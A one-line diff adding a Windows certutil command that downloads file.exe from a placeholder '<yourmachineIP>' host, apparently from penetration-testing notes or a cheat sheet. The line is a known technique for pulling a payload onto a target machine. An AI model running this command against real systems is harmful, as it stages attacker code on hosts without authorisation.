@@ -1,0 +1,1 @@
+certutil.exe -urlcache -f http://<yourmachineIP>/file.exe file.exe
